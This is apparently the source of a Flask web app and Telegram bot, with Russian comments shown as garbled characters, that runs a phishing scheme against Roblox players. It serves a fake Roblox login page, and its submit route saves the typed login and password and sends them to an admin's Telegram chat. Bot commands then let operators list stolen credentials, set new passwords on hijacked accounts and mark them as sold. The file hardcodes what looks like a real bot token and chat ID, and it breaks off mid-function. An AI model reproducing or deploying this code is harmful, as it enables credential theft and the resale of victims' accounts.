from flask import Flask, request, render_template, redirect, url_for
import telebot
from telebot import types
from datetime import datetime, timedelta
import sqlite3
import threading
import time
import os
import requests

# === –ù–∞—Å—Ç—Ä–æ–π–∫–∏ ===
TOKEN = '8028944732:AAH992DI-fMd3OSjfqfs4pEa3J04Jwb48Q4'
ADMIN_CHAT_ID = '6956377285'  # –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ —ç—Ç–æ –≤–∞—à —Ä–µ–∞–ª—å–Ω—ã–π chat_id
SITE_URL = 'https://af1e1cec-dea4-4701-b7a5-fc114fe30358-00-38gvj3r68lile.riker.replit.dev/'

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

# === –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö ===
def init_db():
    conn = sqlite3.connect('bot_database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users 
                 (chat_id TEXT PRIMARY KEY, prefix TEXT, subscription_end TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS credentials 
                 (login TEXT PRIMARY KEY, password TEXT, added_time TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS hacked_accounts 
                 (login TEXT PRIMARY KEY, password TEXT, hack_date TEXT, 
                  prefix TEXT, sold_status TEXT, linked_chat_id TEXT)''')
    c.execute("PRAGMA table_info(credentials)")
    columns = [col[1] for col in c.fetchall()]
    if 'added_time' not in columns:
        c.execute("ALTER TABLE credentials ADD COLUMN added_time TEXT")
    c.execute("PRAGMA table_info(hacked_accounts)")
    columns = [col[1] for col in c.fetchall()]
    if 'linked_chat_id' not in columns:
        c.execute("ALTER TABLE hacked_accounts ADD COLUMN linked_chat_id TEXT")
    
    # –ü—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º "–°–æ–∑–¥–∞—Ç–µ–ª—å" –¥–ª—è ADMIN_CHAT_ID
    subscription_end = (datetime.now() + timedelta(days=3650)).isoformat()  # 10 –ª–µ—Ç –ø–æ–¥–ø–∏—Å–∫–∏
    c.execute("INSERT OR REPLACE INTO users (chat_id, prefix, subscription_end) VALUES (?, ?, ?)",
              (ADMIN_CHAT_ID, "–°–æ–∑–¥–∞—Ç–µ–ª—å", subscription_end))
    conn.commit()
    conn.close()
    print(f"–ü—Ä–µ—Ñ–∏–∫—Å '–°–æ–∑–¥–∞—Ç–µ–ª—å' —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –¥–ª—è chat_id {ADMIN_CHAT_ID}")

# === Keep-alive —Ñ—É–Ω–∫—Ü–∏—è ===
def keep_alive():
    while True:
        try:
            print("üîÅ –û—Ç–ø—Ä–∞–≤–ª—è—é –ø–∏–Ω–≥ –¥–ª—è –ø–æ–¥–¥–µ—Ä–∂–∞–Ω–∏—è –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏...")
            requests.get(SITE_URL)
        except Exception as e:
            print(f"–ü–∏–Ω–≥ –Ω–µ —É–¥–∞–ª—Å—è: {e}")
        time.sleep(300)

# === –†–∞–±–æ—Ç–∞ —Å –±–∞–∑–æ–π –¥–∞–Ω–Ω—ã—Ö ===
def get_user(chat_id):
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("SELECT prefix, subscription_end FROM users WHERE chat_id = ?", (chat_id,))
        result = c.fetchone()
        conn.close()
        if result:
            return {'prefix': result[0], 'subscription_end': datetime.fromisoformat(result[1])}
        return None
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ get_user: {e}")
        return None

def save_user(chat_id, prefix, subscription_end):
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO users (chat_id, prefix, subscription_end) VALUES (?, ?, ?)",
                  (chat_id, prefix, subscription_end.isoformat()))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ save_user: {e}")

def delete_user(chat_id):
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("DELETE FROM users WHERE chat_id = ?", (chat_id,))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ delete_user: {e}")

def save_credential(login, password):
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        added_time = datetime.now().isoformat()
        c.execute("INSERT OR REPLACE INTO credentials (login, password, added_time) VALUES (?, ?, ?)",
                  (login, password, added_time))
        conn.commit()
        conn.close()
        print(f"–°–æ—Ö—Ä–∞–Ω–µ–Ω –ø–∞—Ä–æ–ª—å: {login}, {password}")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ save_credential: {e}")

def get_all_credentials():
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("SELECT login, password, added_time FROM credentials")
        result = c.fetchall()
        conn.close()
        current_time = datetime.now()
        valid_credentials = []
        for login, password, added_time in result:
            if added_time:
                added_dt = datetime.fromisoformat(added_time)
                if (current_time - added_dt).days <= 7:
                    valid_credentials.append((login, password, added_time))
                else:
                    delete_credential(login)
        print(f"–ü–æ–ª—É—á–µ–Ω–æ –ø–∞—Ä–æ–ª–µ–π: {len(valid_credentials)}")
        return valid_credentials
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ get_all_credentials: {e}")
        return []

def delete_credential(login):
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("DELETE FROM credentials WHERE login = ?", (login,))
        rows_affected = c.rowcount
        conn.commit()
        conn.close()
        print(f"–£–¥–∞–ª–µ–Ω –ø–∞—Ä–æ–ª—å –¥–ª—è {login}, –∑–∞—Ç—Ä–æ–Ω—É—Ç–æ —Å—Ç—Ä–æ–∫: {rows_affected}")
        return rows_affected > 0
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ delete_credential: {e}")
        return False

def save_hacked_account(login, password, prefix="–í–∑–ª–æ–º–∞–Ω", sold_status="–ù–µ –ø—Ä–æ–¥–∞–Ω", linked_chat_id=None):
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        hack_date = datetime.now().isoformat()
        c.execute("INSERT OR REPLACE INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id) VALUES (?, ?, ?, ?, ?, ?)",
                  (login, password, hack_date, prefix, sold_status, linked_chat_id))
        conn.commit()
        conn.close()
        print(f"–î–æ–±–∞–≤–ª–µ–Ω –≤ –≤–∑–ª–æ–º–∞–Ω–Ω—ã–µ: {login}, {password}, —Å—Ç–∞—Ç—É—Å: {sold_status}")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ save_hacked_account: {e}")

def get_all_hacked_accounts():
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("SELECT login, password, hack_date, prefix, sold_status, linked_chat_id FROM hacked_accounts")
        result = c.fetchall()
        conn.close()
        return [{'login': row[0], 'password': row[1], 'hack_date': datetime.fromisoformat(row[2]), 
                'prefix': row[3], 'sold_status': row[4], 'linked_chat_id': row[5]} for row in result]
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ get_all_hacked_accounts: {e}")
        return []

def delete_hacked_account(login):
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("DELETE FROM hacked_accounts WHERE login = ?", (login,))
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ delete_hacked_account: {e}")
        return False

def clear_old_credentials():
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("SELECT login, added_time FROM credentials")
        result = c.fetchall()
        current_time = datetime.now()
        deleted = 0
        for login, added_time in result:
            if added_time:
                added_dt = datetime.fromisoformat(added_time)
                if (current_time - added_dt).days > 7:
                    delete_credential(login)
                    deleted += 1
        conn.close()
        return deleted
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ clear_old_credentials: {e}")
        return 0

def get_all_users():
    try:
        conn = sqlite3.connect('bot_database.db')
        c = conn.cursor()
        c.execute("SELECT chat_id, prefix, subscription_end FROM users")
        result = c.fetchall()
        conn.close()
        return [{'chat_id': row[0], 'prefix': row[1], 'subscription_end': datetime.fromisoformat(row[2])} for row in result]
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ get_all_users: {e}")
        return []

# === –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∞–≤ ===
def is_admin(chat_id):
    user = get_user(str(chat_id))
    return user and user['prefix'] in ['–ê–¥–º–∏–Ω', '–°–æ–∑–¥–∞—Ç–µ–ª—å']

def is_creator(chat_id):
    user = get_user(str(chat_id))
    return user and user['prefix'] == '–°–æ–∑–¥–∞—Ç–µ–ª—å'

# === Flask –º–∞—Ä—à—Ä—É—Ç—ã ===
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login-roblox.html')
def login_page():
    return render_template('login-roblox.html')

@app.route('/submit', methods=['POST'])
def submit():
    login = request.form.get('login')
    password = request.form.get('password')
    if login and password:
        save_credential(login, password)
        bot.send_message(ADMIN_CHAT_ID, f"üîê –ù–æ–≤—ã–π –ª–æ–≥–∏–Ω:\n–õ–æ–≥–∏–Ω: {login}\n–ü–∞—Ä–æ–ª—å: {password}")
    return redirect(url_for('not_found'))

@app.route('/404')
def not_found():
    return render_template('404.html')

# === –ö–æ–º–∞–Ω–¥—ã Telegram –±–æ—Ç–∞ ===
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    if not get_user(chat_id):
        save_user(chat_id, '–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å', datetime.now())
    bot.reply_to(message, "‚úÖ –ë–æ—Ç –∞–∫—Ç–∏–≤–µ–Ω. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /menu –¥–ª—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏.")

@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    user = get_user(str(message.chat.id))
    if not user:
        bot.reply_to(message, "–í—ã –Ω–µ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω—ã!")
        return
    time_left = user['subscription_end'] - datetime.now()
    time_str = f"{time_left.days} –¥–Ω–µ–π" if time_left.total_seconds() > 0 else "–ü–æ–¥–ø–∏—Å–∫–∞ –∏—Å—Ç–µ–∫–ª–∞"
    bot.reply_to(message, f"üßæ –í–∞—à —Å—Ç–∞—Ç—É—Å:\n–ü—Ä–µ—Ñ–∏–∫—Å: {user['prefix']}\n–ü–æ–¥–ø–∏—Å–∫–∞: {time_str}")

@bot.message_handler(commands=['site'])
def site_cmd(message):
    user = get_user(str(message.chat.id))
    if not user or user['prefix'] == '–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å':
        bot.reply_to(message, "üîí –î–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –¥–ª—è –ø–æ–¥–ø–∏—Å—á–∏–∫–æ–≤!")
        return
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("–ü–µ—Ä–µ–π—Ç–∏ –Ω–∞ —Å–∞–π—Ç", url=SITE_URL))
    bot.reply_to(message, "üåê –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:", reply_markup=markup)

@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    
    if not args:
        accounts = get_all_hacked_accounts()
        if not accounts:
            bot.reply_to(message, "üì≠ –°–ø–∏—Å–æ–∫ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –ø—É—Å—Ç!")
            return
        response = "üìã –°–ø–∏—Å–æ–∫ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤:\n\n"
        for acc in accounts:
            response += (f"–õ–æ–≥–∏–Ω: {acc['login']}\n"
                        f"–ü–∞—Ä–æ–ª—å: {acc['password']}\n"
                        f"–î–∞—Ç–∞ –≤–∑–ª–æ–º–∞: {acc['hack_date'].strftime('%Y-%m-%d %H:%M')}\n"
                        f"–ü—Ä–µ—Ñ–∏–∫—Å: {acc['prefix']}\n"
                        f"–°—Ç–∞—Ç—É—Å: {acc['sold_status']}\n"
                        f"–ü—Ä–∏–≤—è–∑–∫–∞: {acc['linked_chat_id'] or '–ù–µ—Ç'}\n\n")
        
        if len(response) > 4096:
            parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
            for part in parts:
                bot.reply_to(message, part)
        else:
            bot.reply_to(message, response)
        return

    if args[0] == "add" and len(args) >= 3:
        login, password = args[1], args[2]
        prefix = args[3] if len(args) > 3 else "–í–∑–ª–æ–º–∞–Ω"
        sold_status = args[4] if len(args) > 4 else "–ù–µ –ø—Ä–æ–¥–∞–Ω"
        linked_chat_id = args[5] if len(args) > 5 else None
        save_hacked_account(login, password, prefix, sold_status, linked_chat_id)
        bot.reply_to(message, f"‚úÖ –ê–∫–∫–∞—É–Ω—Ç {login} –¥–æ–±–∞–≤–ª–µ–Ω –≤ —Å–ø–∏—Å–æ–∫ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö!")
        
    elif args[0] == "delete" and len(args) == 2:
        login = args[1]
        if delete_hacked_account(login):
            bot.reply_to(message, f"‚úÖ –ê–∫–∫–∞—É–Ω—Ç {login} —É–¥–∞–ª–µ–Ω –∏–∑ —Å–ø–∏—Å–∫–∞ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö!")
        else:
            bot.reply_to(message, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –∞–∫–∫–∞—É–Ω—Ç–∞!")

@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    chat_id = str(message.chat.id)
    bot.reply_to(message, f"–í–∞—à Chat ID: {chat_id}")

@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    if not is_admin(message.chat.id):
        bot.reply_to(message, "üîí –ö–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º!")
        return
    try:
        credentials = get_all_credentials()
        if not credentials:
            bot.reply_to(message, "üì≠ –°–ø–∏—Å–æ–∫ –ø–∞—Ä–æ–ª–µ–π –ø—É—Å—Ç!")
            return
        
        for login, password, added_time in credentials:
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton("–î–æ–±–∞–≤–∏—Ç—å –≤ –≤–∑–ª–æ–º–∞–Ω–Ω—ã–µ", callback_data=f"hack_{login}"),
                types.InlineKeyboardButton("–£–¥–∞–ª–∏—Ç—å", callback_data=f"delete_{login}")
            )
            response = (f"–õ–æ–≥–∏–Ω: {login}\n"
                        f"–ü–∞—Ä–æ–ª—å: {password}\n"
                        f"–î–æ–±–∞–≤–ª–µ–Ω–æ: {datetime.fromisoformat(added_time).strftime('%Y-%m-%d %H:%M')}")
            bot.send_message(message.chat.id, response, reply_markup=markup)
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–∞—Ä–æ–ª–µ–π: {e}")
        print(f"Error in passwords_cmd: {e}")

@bot.message_handler(commands=['opendb'])
def opendb_cmd(message):
    if not is_creator(message.chat.id):
        bot.reply_to(message, "üîí –ö–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –°–æ–∑–¥–∞—Ç–µ–ª—é!")
        return
    try:
        response = "üóÑÔ∏è –ü—Ä–æ—Å–º–æ—Ç—Ä –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö:\n\n"

        # –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏
        response += "üë• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏:\n"
        users = get_all_users()
        if not users:
            response += "–ü—É—Å—Ç–æ\n"
        for user in users:
            time_left = user['subscription_end'] - datetime.now()
            time_str = f"{time_left.days} –¥–Ω–µ–π" if time_left.total_seconds() > 0 else "–ò—Å—Ç–µ–∫–ª–∞"
            response += f"Chat ID: {user['chat_id']}, –ü—Ä–µ—Ñ–∏–∫—Å: {user['prefix']}, –ü–æ–¥–ø–∏—Å–∫–∞: {time_str}\n"

        # –ü–∞—Ä–æ–ª–∏
        response += "\nüîë –ü–∞—Ä–æ–ª–∏:\n"
        credentials = get_all_credentials()
        if not credentials:
            response += "–ü—É—Å—Ç–æ\n"
        for login, password, added_time in credentials:
            response += f"–õ–æ–≥–∏–Ω: {login}, –ü–∞—Ä–æ–ª—å: {password}, –î–æ–±–∞–≤–ª–µ–Ω–æ: {datetime.fromisoformat(added_time).strftime('%Y-%m-%d %H:%M')}\n"

        # –í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã
        response += "\nüîì –í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã:\n"
        hacked_accounts = get_all_hacked_accounts()
        if not hacked_accounts:
            response += "–ü—É—Å—Ç–æ\n"
        for acc in hacked_accounts:
            response += (f"–õ–æ–≥–∏–Ω: {acc['login']}, –ü–∞—Ä–æ–ª—å: {acc['password']}, "
                        f"–î–∞—Ç–∞: {acc['hack_date'].strftime('%Y-%m-%d %H:%M')}, "
                        f"–ü—Ä–µ—Ñ–∏–∫—Å: {acc['prefix']}, –°—Ç–∞—Ç—É—Å: {acc['sold_status']}, "
                        f"–ü—Ä–∏–≤—è–∑–∫–∞: {acc['linked_chat_id'] or '–ù–µ—Ç'}\n")

        if len(response) > 4096:
            parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
            for part in parts:
                bot.reply_to(message, part)
        else:
            bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫—Ä—ã—Ç–∏–∏ –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö: {e}")
        print(f"Error in opendb_cmd: {e}")

@bot.message_handler(commands=['database'])
def database_cmd(message):
    if not is_creator(message.chat.id):
        bot.reply_to(message, "üîí –ö–æ–º–∞–Ω–¥–∞ –¥–æ—Å—Ç—É–ø–Ω–∞ —Ç–æ–ª—å–∫–æ –°–æ–∑–¥–∞—Ç–µ–ª—é!")
        return
    try:
        response = "üóÑÔ∏è –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö:\n\n"

        # –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏
        response += "üë• –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏:\n"
        users = get_all_users()
        if not users:
            response += "–ü—É—Å—Ç–æ\n"
        for user in users:
            time_left = user['subscription_end'] - datetime.now()
            time_str = f"{time_left.days} –¥–Ω–µ–π" if time_left.total_seconds() > 0 else "–ò—Å—Ç–µ–∫–ª–∞"
            response += f"Chat ID: {user['chat_id']}, –ü—Ä–µ—Ñ–∏–∫—Å: {user['prefix']}, –ü–æ–¥–ø–∏—Å–∫–∞: {time_str}\n"

        # –ü–∞—Ä–æ–ª–∏
        response += "\nüîë –ü–∞—Ä–æ–ª–∏:\n"
        credentials = get_all_credentials()
        if not credentials:
            response += "–ü—É—Å—Ç–æ\n"
        for login, password, added_time in credentials:
            response += f"–õ–æ–≥–∏–Ω: {login}, –ü–∞—Ä–æ–ª—å: {password}, –î–æ–±–∞–≤–ª–µ–Ω–æ: {datetime.fromisoformat(added_time).strftime('%Y-%m-%d %H:%M')}\n"

        # –í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã
        response += "\nüîì –í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã:\n"
        hacked_accounts = get_all_hacked_accounts()
        if not hacked_accounts:
            response += "–ü—É—Å—Ç–æ\n"
        for acc in hacked_accounts:
            response += (f"–õ–æ–≥–∏–Ω: {acc['login']}, –ü–∞—Ä–æ–ª—å: {acc['password']}, "
                        f"–î–∞—Ç–∞: {acc['hack_date'].strftime('%Y-%m-%d %H:%M')}, "
                        f"–ü—Ä–µ—Ñ–∏–∫—Å: {acc['prefix']}, –°—Ç–∞—Ç—É—Å: {acc['sold_status']}, "
                        f"–ü—Ä–∏–≤—è–∑–∫–∞: {acc['linked_chat_id'] or '–ù–µ—Ç'}\n")

        response += "\nüìù –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:\n"
        response += "/database add_user <chat_id> <prefix> <days>\n"
        response += "/database add_cred <login> <password>\n"
        response += "/database add_hacked <login> <password> <prefix> <sold_status> <linked_chat_id>\n"
        response += "/database delete_user <chat_id>\n"
        response += "/database delete_cred <login>\n"
        response += "/database delete_hacked <login>\n"

        if len(response) > 4096:
            parts = [response[i:i+4096] for i in range(0, len(response), 4096)]
            for part in parts:
                bot.reply_to(message, part)
        else:
            bot.reply_to(message, response)

        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤
        args = message.text.split()[1:] if len(message.text.split()) > 1 else []
        if args:
            if args[0] == "add_user" and len(args) == 4:
                chat_id, prefix, days = args[1], args[2], int(args[3])
                subscription_end = datetime.now() + timedelta(days=days)
                save_user(chat_id, prefix, subscription_end)
                bot.send_message(message.chat.id, f"‚úÖ –î–æ–±–∞–≤–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id}")
            
            elif args[0] == "add_cred" and len(args) == 3:
                login, password = args[1], args[2]
                save_credential(login, password)
                bot.send_message(message.chat.id, f"‚úÖ –î–æ–±–∞–≤–ª–µ–Ω –ø–∞—Ä–æ–ª—å –¥–ª—è {login}")
            
            elif args[0] == "add_hacked" and len(args) >= 3:
                login, password = args[1], args[2]
                prefix = args[3] if len(args) > 3 else "–í–∑–ª–æ–º–∞–Ω"
                sold_status = args[4] if len(args) > 4 else "–ù–µ –ø—Ä–æ–¥–∞–Ω"
                linked_chat_id = args[5] if len(args) > 5 else None
                save_hacked_account(login, password, prefix, sold_status, linked_chat_id)
                bot.send_message(message.chat.id, f"‚úÖ –î–æ–±–∞–≤–ª–µ–Ω –≤–∑–ª–æ–º–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç {login}")
            
            elif args[0] == "delete_user" and len(args) == 2:
                chat_id = args[1]
                delete_user(chat_id)
                bot.send_message(message.chat.id, f"‚úÖ –£–¥–∞–ª–µ–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id}")
            
            elif args[0] == "delete_cred" and len(args) == 2:
                login = args[1]
                delete_credential(login)
                bot.send_message(message.chat.id, f"‚úÖ –£–¥–∞–ª–µ–Ω –ø–∞—Ä–æ–ª—å –¥–ª—è {login}")
            
            elif args[0] == "delete_hacked" and len(args) == 2:
                login = args[1]
                delete_hacked_account(login)
                bot.send_message(message.chat.id, f"‚úÖ –£–¥–∞–ª–µ–Ω –≤–∑–ª–æ–º–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç {login}")
            
            else:
                bot.send_message(message.chat.id, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã!")
    except Exception as e:
        bot.reply_to(message, f"‚ùå –û—à–∏–±–∫–∞: {e}")
        print(f"Error in database_cmd: {e}")

# === –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–Ω–æ–ø–æ–∫ ===
@bot.callback_query_handler(func=lambda call: call.data.startswith("hack_") or call.data.startswith("delete_"))
def handle_callback(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "üîí –î–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º!")
        return

    if call.data.startswith("hack_"):
        login = call.data.split("_")[1]
        credentials = get_all_credentials()
        for cred_login, old_password, _ in credentials:
            if cred_login == login:
                msg = bot.send_message(
                    call.message.chat.id,
                    f"–õ–æ–≥–∏–Ω: {login}\n–°—Ç–∞—Ä—ã–π –ø–∞—Ä–æ–ª—å: {old_password}\n–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π –ø–∞—Ä–æ–ª—å –¥–ª—è –≤–∑–ª–æ–º–∞–Ω–Ω–æ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:"
                )
                bot.register_next_step_handler(msg, lambda m: process_new_password(m, login, old_password, call.message.message_id))
                break
        bot.answer_callback_query(call.id, "–í–≤–µ–¥–∏—Ç–µ –Ω–æ–≤—ã–π –ø–∞—Ä–æ–ª—å")

    elif call.data.startswith("delete_"):
        login = call.data.split("_")[1]
        if delete_credential(login):
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"–õ–æ–≥–∏–Ω: {login}\nüóëÔ∏è –£–¥–∞–ª–µ–Ω–æ –∏–∑ –±–∞–∑—ã!",
                reply_markup=None
            )
            bot.send_message(ADMIN_CHAT_ID, f"üóëÔ∏è {login} —É–¥–∞–ª–µ–Ω–æ –∏–∑ –ø–∞—Ä–æ–ª–µ–π!")
        else:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"–õ–æ–≥–∏–Ω: {login}\n‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏!",
                reply_markup=None
            )
        bot.answer_callback_query(call.id, "–£—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω–æ!")

def process_new_password(message, login, old_password, original_message_id):
    new_password = message.text
    if not new_password:
        bot.send_message(message.chat.id, "‚ùå –ü–∞—Ä–æ–ª—å –Ω–µ –º–æ–∂–µ—Ç –±—ã—Ç—å –ø—É—Å—Ç—ã–º!")
        return
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("–í–∑–ª–æ–º–∞–Ω", callback_data=f"status_{login}_{new_password}_–í–∑–ª–æ–º–∞–Ω"),
        types.InlineKeyboardButton("–ü—Ä–æ–¥–∞–Ω", callback_data=f"status_{login}_{new_password}_–ü—Ä–æ–¥–∞–Ω")
    )
    markup.add(types.InlineKeyboardButton("–ü—Ä–∏–≤—è–∑–∞—Ç—å –∫ –∞–∫–∫–∞—É–Ω—Ç—É", callback_data=f"link_{login}_{new_password}"))
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=original_message_id,
        text=f"–õ–æ–≥–∏–Ω: {login}\n–ù–æ–≤—ã–π –ø–∞—Ä–æ–ª—å: {new_password}\n–í—ã–±–µ—Ä–∏—Ç–µ —Å—Ç–∞—Ç—É—Å:",
        reply_markup=markup
    )
    bot.delete_message(message.chat.id, message.message_id)

@bot.callback_query_handler(func=lambda call: call.data.startswith("status_"))
def handle_status(call):
    if not is_admin(call.message.chat.id):
        bot.answer_callback_query(call.id, "üîí –î–æ—Å—Ç—É–ø–Ω–æ —Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞–º!")
        return
    try:
        _, login, new_password, status = call.data.split("_")
        if delete_credential(login):  # –£–¥–∞–ª—è–µ–º –∏–∑ credentials –ø–µ—Ä–µ–¥ –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ–º
            save_hacked_account(login, new_password, prefix=status, sold_status=status)
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"–õ–æ–≥–∏–Ω: {login}\n–ü–∞—Ä–æ–ª—å: {new_password}\n‚úÖ –î–æ–±–∞–≤–ª–µ–Ω–æ –≤ –≤–∑–ª–æ–º–∞–Ω–Ω—ã–µ —Å–æ —Å—Ç–∞—Ç—É—Å–æ–º '{status}'!",
                reply_markup=None
            )
            bot.send_message(ADMIN_CHAT_ID, f"üîí {login} –¥–æ–±–∞–≤–ª–µ–Ω–æ –≤ –≤–∑–ª–æ–º–∞–Ω–Ω—ã–µ —Å–æ —Å—Ç–∞—Ç—É—Å–æ–º '{status}'!")
            bot.answer_callback_query(call.id, "–£—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω–æ!")
        else:
            bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=f"–õ–æ–≥–∏–Ω: {login}\n‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –≤ –≤–∑–ª–æ–º–∞–Ω–Ω—ã–µ!",
                reply_markup=None
            )
            bot.answer_callback_query(call.id, "–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –∏–∑ credentials!")
    except Exception as e:
        bot.answer_callback_query(call.id, f"–û—à–∏–±–∫–∞: {e}")
        print(f"–û—à–∏–±–∫–∞ –≤ handle_status: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("link_"))
def handle_link(call):
    if not is_admin(call.message.chat.id):
